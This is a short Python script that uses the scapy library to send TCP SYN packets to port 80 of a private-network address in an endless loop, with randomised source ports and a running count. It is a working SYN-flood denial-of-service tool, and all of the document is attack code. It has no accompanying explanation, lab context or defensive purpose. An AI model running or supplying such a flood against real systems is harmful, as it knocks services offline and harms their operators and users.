import sys
import random
import os
from scapy.all import *

packet_count = 0
while (1 == 1):
 a=IP(dst='192.168.1.100')/TCP(flags="S", sport=RandShort(), dport=80)
 send(a, verbose=0)
 packet_count = packet_count + 1
 print('SYN packet number: ' + str(packet_count) + ' was sent')
